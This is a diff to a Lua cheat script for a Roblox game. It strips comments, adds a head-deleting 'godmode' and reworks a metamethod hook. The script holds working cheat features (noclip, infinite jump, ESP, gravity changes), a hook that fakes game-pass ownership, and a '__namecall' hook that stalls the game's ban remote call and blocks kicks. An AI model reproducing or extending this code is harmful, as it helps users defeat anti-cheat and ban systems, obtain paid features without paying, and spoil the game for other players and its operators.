     ["Max"] = 150,
-    ["Function"] = function(val) -- function that is called when the slider changes
+    ["Function"] = function(val)  
         fly_vertical_speed = val
     end,
-    ["HoverText"] = "The speed you're going to move upwards", -- text that will show up after hovering over the button (optional)
-    ["Default"] = 50 -- default value (optional)
+    ["HoverText"] = "The speed you're going to move upwards",  
+    ["Default"] = 50  
 })
 local Noclip = Blatant.CreateOptionsButton({
-    ["Name"] = "Noclip", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Noclip",  
+    ["Function"] = function(callback)  
         if callback then
             bind("Noclip", runService.Stepped:Connect(function()
                 if cl.Character and cl.Character.Parent then
@@ -1341,11 +1383,11 @@ local Noclip = Blatant.CreateOptionsButton({
             unbind("Noclip")
         end
     end,
-    ["HoverText"] = "Allows you to go trough solid objects", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Allows you to go trough solid objects",  
 })
 local Infjump = Blatant.CreateOptionsButton({
-    ["Name"] = "Infinite jump", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Infinite jump",  
+    ["Function"] = function(callback)  
         if callback then
             bind("InfiniteJump", uis.InputBegan:Connect(function(i,v)
                 if not v and i.KeyCode == Enum.KeyCode.Space then
@@ -1358,12 +1400,29 @@ local Infjump = Blatant.CreateOptionsButton({
             unbind("InfiniteJump")
         end
     end,
-    ["HoverText"] = "average happy mod user", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "average happy mod user",  
+})
+local PassiveGodmode; PassiveGodmode = Blatant.CreateOptionsButton({
+    ["Name"] = "Pacifist godmode",  
+    ["Function"] = function(callback)  
+        if callback then
+            if cl.Character then
+                if cl.Character:FindFirstChild("Head") then
+                    cl.Character:FindFirstChild("Head"):Destroy()
+                    PassiveGodmode["ToggleButton"](false)
+                else
+                    shared.GuiLibrary["CreateNotification"]("Godmode","You already have the passive godmode enabled, reset to disable it", 5, "assets/InfoNotification.png")
+                    PassiveGodmode["ToggleButton"](false)
+                end
+            end
+        end
+    end,
+    ["HoverText"] = "Can't attack others, neither they can.",  
 })
 --// Render
 local NoLightingChange = Render.CreateOptionsButton({
-    ["Name"] = "No lighting change", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "No lighting change",  
+    ["Function"] = function(callback)  
         if callback then
             lighting.RageCC.Enabled = false
             lighting.MadnessCC.Enabled = false
@@ -1372,22 +1431,22 @@ local NoLightingChange = Render.CreateOptionsButton({
             lighting.MadnessCC.Enabled = true
         end
     end,
-    ["HoverText"] = "Makes rage and madness not affect lighting", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Makes rage and madness not affect lighting",  
 })
 local SanctuaryLighting = Render.CreateOptionsButton({
-    ["Name"] = "Sanctuary lighting", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Sanctuary lighting",  
+    ["Function"] = function(callback)  
         if callback then
             cl:SetAttribute("WorldArea", "Sanctuary")
         else
             cl:SetAttribute("WorldArea", "Main")
         end
     end,
-    ["HoverText"] = "Changes the lighting to the sanctuary one", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Changes the lighting to the sanctuary one",  
 })
 local PilesESP = Render.CreateOptionsButton({
-    ["Name"] = "Piles ESP", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Piles ESP",  
+    ["Function"] = function(callback)  
         if callback then
             for _,v in pairs(workspace.Piles:GetChildren()) do
                 if v:IsA("Model") then
@@ -1403,11 +1462,11 @@ local PilesESP = Render.CreateOptionsButton({
             end
         end
     end,
-    ["HoverText"] = "Makes finding piles alot easier", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "Makes finding piles alot easier",  
 })
 local MysteryBoxESP = Render.CreateOptionsButton({
-    ["Name"] = "Mystery box ESP", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Mystery box ESP",  
+    ["Function"] = function(callback)  
         if callback then
             local highlight = Instance.new("Highlight", game:GetService("CoreGui"))
             highlight.FillTransparency = .75; highlight.FillColor = Color3.fromRGB(32, 144, 196) highlight.OutlineColor = Color3.fromRGB(32, 144, 196); highlight.OutlineTransparency = 0; highlight.Name = "BOX_ESP"; highlight.Adornee = workspace.Mystery.MysteryBox
@@ -1417,12 +1476,12 @@ local MysteryBoxESP = Render.CreateOptionsButton({
             end  
         end
     end,
-    ["HoverText"] = "box.", -- text that will show up after hovering over the button (optional)
+    ["HoverText"] = "box.",  
 })
 --// World
 local Gravity = World.CreateOptionsButton({
-    ["Name"] = "Gravity", -- name of object
-    ["Function"] = function(callback) -- function that is called when toggled
+    ["Name"] = "Gravity",  
+    ["Function"] = function(callback)  
         gravityEnabled = callback
         if (not callback) then
             workspace.Gravity = 196.2
@@ -1430,44 +1489,31 @@ local Gravity = World.CreateOptionsButton({
     end,
 })
 Gravity.CreateSlider({
-    ["Name"] = "Gravity", -- name of object
+    ["Name"] = "Gravity",  
     ["Min"] = 0,
     ["Max"] = 196,
-    ["Function"] = function(val) -- function that is called when the slider changes
+    ["Function"] = function(val)  
         workspace.Gravity = gravityEnabled and tonumber(val) or 196.2
     end,
-    ["Default"] = 196 -- default value (optional)
+    ["Default"] = 196  
 })
 --// End of script
 local hooked_emotes = hookfunction(game:GetService("MarketplaceService").UserOwnsGamePassAsync, function(...)
     return bypassEmotes
 end)
 if not getgenv()._G.BypassedMetas then
-    --// Ban bypass or something
-    local GetRawMetaFunc = getrawmetatable or debug.getmetatable
-    --
-    local GameRawMetatable = GetRawMetaFunc(game)
-    --
-    if setreadonly then -- support for multiple exploits
-        setreadonly(GameRawMetatable, false)
-    elseif make_writeable then
-        make_writeable(GameRawMetatable)
-    end
-    --
-    local OriginalNamecall = GameRawMetatable.__namecall
-    --
-    GameRawMetatable.__namecall = newcclosure(function(self, ...)
-        local CallMethod = tostring(getnamecallmethod()) -- idk if tostring is needed but i use it anyways
+    local OldIndex; OldIndex = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+        local CallMethod = tostring(getnamecallmethod())
         local Args = {...}
         --
-        if CallMethod == "FireServer" and self.Name == "MainRemote" and Args[1] == "hello!!" then -- the "ban" argument is "hello!!" lol.
-            return task.wait(math.huge) or task.wait(9e9) -- returns an infinite wait so we don't get banned but sadly we do get crashed :(
+        if CallMethod == "FireServer" and self.Name == "MainRemote" and Args[1] == "hello!!" then
+            return task.wait(math.huge) or task.wait(9e9)
+        elseif CallMethod == "Kick" and self == cl and (not canbeKickedFromGame and not LeaveOnStaffJoin["Toggle"]) then
+            return task.wait(math.huge) or task.wait(9e9)
         end
-        if CallMethod == "Kick" and self == cl and (not canbeKickedFromGame and not LeaveOnStaffJoin["Toggle"]) then -- an anti kick (Client side ofc)
-            return
-        end
-        return OriginalNamecall(self, ...) -- we need this so roblox doesn't kill himself
-    end)
+        --
+        return OldIndex(self, ...)
+    end))
     getgenv()._G.BypassedMetas = true
 end
 --
@@ -1478,7 +1524,7 @@ game:GetService("ScriptContext"):SetTimeout(.05)
 --
 shared.GuiLibrary.SelfDestructEvent.Event:Connect(function()
     for i,_ in pairs(newHitboxes) do
-        newHitboxes[i]:Destroy() -- Just so the hitboxes don't glitch
+        newHitboxes[i]:Destroy()
     end
     if killauraCircleRange then
         killauraCircleRange:Destroy()
